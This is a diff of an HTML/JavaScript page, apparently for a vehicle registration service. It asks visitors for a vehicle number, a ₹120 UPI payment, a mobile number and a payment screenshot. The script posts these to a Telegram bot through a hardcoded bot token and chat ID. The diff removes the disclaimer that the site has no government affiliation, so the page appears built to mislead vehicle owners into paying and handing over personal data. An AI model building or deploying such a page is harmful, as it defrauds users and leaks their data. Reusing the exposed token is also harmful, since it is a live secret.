@@ -10,14 +10,13 @@
 
 body{
 min-height:100vh;
-display:flex;
-flex-direction:column;
-justify-content:center;
-align-items:center;
 background:linear-gradient(-45deg,#4facfe,#00f2fe,#43e97b,#38f9d7);
 background-size:400% 400%;
 animation:gradientMove 10s ease infinite;
-padding:20px;
+padding-top:70px;
+display:flex;
+flex-direction:column;
+align-items:center;
 }
 
 @keyframes gradientMove{
@@ -26,42 +25,99 @@ padding:20px;
 100%{background-position:0% 50%}
 }
 
-.card{
+/* Top Bar */
+.topbar{
+position:fixed;
+top:0;
+left:0;
 width:100%;
-max-width:420px;
+height:60px;
 background:white;
-border-radius:24px;
-padding:28px;
-box-shadow:0 15px 40px rgba(0,0,0,0.2);
-text-align:center;
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:0 15px;
+box-shadow:0 3px 15px rgba(0,0,0,0.15);
+z-index:1000;
 }
 
-h2{margin-bottom:18px;color:#1d2b64;}
-
-input,button{
-width:100%;
-padding:15px;
-margin-top:14px;
-border-radius:14px;
-font-size:15px;
-}
-
-input{border:1px solid #ddd;}
-
-button{
+.topbar button{
 background:#1d2b64;
 color:white;
-font-weight:600;
 border:none;
+padding:8px 14px;
+border-radius:8px;
+font-size:14px;
+cursor:pointer;
+box-shadow:0 4px 10px rgba(0,0,0,0.2);
+}
+
+.topbar button:active{
+transform:scale(0.95);
+box-shadow:0 2px 5px rgba(0,0,0,0.3);
+}
+
+/* Menu */
+.menuBox{
+position:fixed;
+top:60px;
+right:10px;
+background:white;
+width:220px;
+border-radius:12px;
+box-shadow:0 5px 20px rgba(0,0,0,0.2);
+display:none;
+padding:15px;
+z-index:1000;
+}
+
+.menuBox button{
+width:100%;
+margin-top:10px;
+padding:10px;
+border:none;
+background:#f1f1f1;
+border-radius:8px;
 cursor:pointer;
 }
 
+.card{
+width:95%;
+max-width:420px;
+background:white;
+margin-top:20px;
+padding:25px;
+border-radius:20px;
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
+text-align:center;
+}
+
+input,button{
+width:100%;
+padding:14px;
+margin-top:12px;
+border-radius:10px;
+border:1px solid #ddd;
+font-size:15px;
+}
+
+.mainBtn{
+background:#1d2b64;
+color:white;
+border:none;
+cursor:pointer;
+box-shadow:0 6px 15px rgba(0,0,0,0.2);
+}
+
+.mainBtn:active{
+transform:scale(0.97);
+box-shadow:0 3px 8px rgba(0,0,0,0.3);
+}
+
 img{
-width:210px;
-margin:18px auto;
+width:200px;
+margin:15px auto;
 display:block;
-border-radius:18px;
-box-shadow:0 10px 25px rgba(0,0,0,0.15);
 }
 
 .hidden{display:none;}
@@ -79,35 +135,41 @@ align-items:center;
 justify-content:center;
 flex-direction:column;
 color:white;
-z-index:999;
-text-align:center;
-padding:20px;
+z-index:2000;
 }
 
 .spinner{
-width:60px;
-height:60px;
-border:6px solid #fff;
-border-top:6px solid #00ffd5;
+width:50px;
+height:50px;
+border:5px solid #fff;
+border-top:5px solid #00ffd5;
 border-radius:50%;
 animation:spin 1s linear infinite;
-margin-bottom:20px;
+margin-bottom:15px;
 }
 
 @keyframes spin{to{transform:rotate(360deg);}}
 
 .footer{
 margin-top:30px;
-max-width:420px;
 text-align:center;
 font-size:13px;
 color:white;
-line-height:1.7;
+padding:15px;
 }
 </style>
 </head>
 
 <body>
+
+<div class="topbar">
+<button onclick="goHome()">🏠 Home</button>
+<button onclick="toggleMenu()">☰</button>
+</div>
+
+<div class="menuBox" id="menuBox">
+<button onclick="openInsurance()">Insurance</button>
+</div>
 
 <div class="loader" id="loader">
 <div class="spinner"></div>
@@ -116,60 +178,100 @@ line-height:1.7;
 
 <div class="card">
 
-<!-- PAGE 1 -->
 <div id="p1">
-<h2>Enter Vehicle Number</h2>
+<h3>Enter Vehicle Number</h3>
 <input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
-<button onclick="goPay()">Continue</button>
+<button class="mainBtn" onclick="goPay()">Continue</button>
 </div>
 
-<!-- PAGE 2 -->
 <div id="p2" class="hidden">
-<h2>Service Fee ₹120</h2>
+<h3>Service Fee ₹120</h3>
 
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBest%20Insurance%26am%3D120.00%26cu%3DINR">
 
-<p><strong>UPI:</strong> bestinsurance@upi</p>
+<p>UPI: bestinsurance@upi </p>
 
-<button onclick="openUPI()">Pay with UPI</button>
+<button class="mainBtn" onclick="openUPI()">Pay with UPI</button>
 
 <input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof" accept="image/*">
+<input type="file" id="proof">
 
-<button onclick="submitForm()">Submit</button>
+<button class="mainBtn" onclick="submitForm()">Submit</button>
 </div>
 
-<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h2>🎉 Congratulations!</h2>
-<p>
-मुझे आपकी request मिल गई है।<br>
-हम जल्द ही आपसे संपर्क करेंगे।
-</p>
-<button onclick="goHome()">Home</button>
+<h3>🎉 Congratulations!</h3>
+<p>हम जल्द ही आपसे संपर्क करेंगे।</p>
+<button class="mainBtn" onclick="goHome()">Home</button>
 </div>
 
 </div>
 
 <div class="footer">
-<b>About:</b> Independent Vehicle Assistance Platform<br>
-<b>Disclaimer:</b> Private service platform not affiliated with any government authority.<br>
 © 2026 Mishra Service
 </div>
 
 <script>
 
-// 🔴 PUT YOUR TELEGRAM DETAILS HERE
-const token = "8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
-const chatId = "5600045707";
+const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
+const chatId="5600045707";
 
-function showLoader(text){
-document.getElementById("loaderText").innerHTML=text;
-document.getElementById("loader").style.display="flex";
+function toggleMenu(){
+let box=document.getElementById("menuBox");
+box.style.display=box.style.display==="block"?"none":"block";
 }
 
-function hideLoader(){
+function openInsurance(){
+alert("Insurance page yahan open hoga");
+}
+
+function goHome(){
+p1.classList.remove("hidden");
+p2.classList.add("hidden");
+p3.classList.add("hidden");
+vehicle.value="";
+mobile.value="";
+proof.value="";
+}
+
+function goPay(){
+if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
+p1.classList.add("hidden");
+p2.classList.remove("hidden");
+}
+
+function openUPI(){
+window.location.href="upi://pay?pa=bestinsurance@upi&pn=Best%20Insurance&am=120.00&cu=INR";
+}
+
+function submitForm(){
+if(mobile.value.length<10){alert("Enter valid mobile");return;}
+if(!proof.files[0]){alert("Upload screenshot");return;}
+
+document.getElementById("loader").style.display="flex";
+
+let data=new FormData();
+data.append("chat_id",chatId);
+data.append("caption",`Vehicle: ${vehicle.value}\nMobile: ${mobile.value}`);
+data.append("photo",proof.files[0]);
+
+fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+method:"POST",
+body:data
+})
+.then(()=>{
+
 document.getElementById("loader").style.display="none";
+p2.classList.add("hidden");
+p3.classList.remove("hidden");
+
+setTimeout(()=>{goHome();},7000);
+
+})
+.catch(()=>{
+document.getElementById("loader").style.display="none";
+alert("Submission failed");
+});
 }
 
 function formatVehicle(el){
@@ -183,68 +285,6 @@ if(p2) out+="-"+p2;
 if(p3) out+="-"+p3;
 if(p4) out+="-"+p4;
 el.value=out;
-}
-
-function goPay(){
-if(!vehicle.value.trim()){
-alert("Vehicle number required");
-return;
-}
-p1.classList.add("hidden");
-p2.classList.remove("hidden");
-}
-
-function openUPI(){
-window.location.href="upi://pay?pa=bestinsurance@upi&pn=Best%20Insurance&am=120.00&cu=INR";
-}
-
-function submitForm(){
-
-if(mobile.value.length<10){
-alert("Enter valid mobile number");
-return;
-}
-
-if(!proof.files[0]){
-alert("Upload payment screenshot");
-return;
-}
-
-showLoader("आपकी request भेजी जा रही है...");
-
-let data = new FormData();
-data.append("chat_id", chatId);
-data.append("caption",
-`🚗 New RC Request
-
-Vehicle: ${vehicle.value}
-Mobile: ${mobile.value}`
-);
-data.append("photo", proof.files[0]);
-
-fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
-method:"POST",
-body:data
-})
-.then(res=>res.json())
-.then(()=>{
-hideLoader();
-p2.classList.add("hidden");
-p3.classList.remove("hidden");
-})
-.catch(()=>{
-hideLoader();
-alert("Submission failed. Try again.");
-});
-}
-
-function goHome(){
-p3.classList.add("hidden");
-p2.classList.add("hidden");
-p1.classList.remove("hidden");
-vehicle.value="";
-mobile.value="";
-proof.value="";
 }
 
 </script>
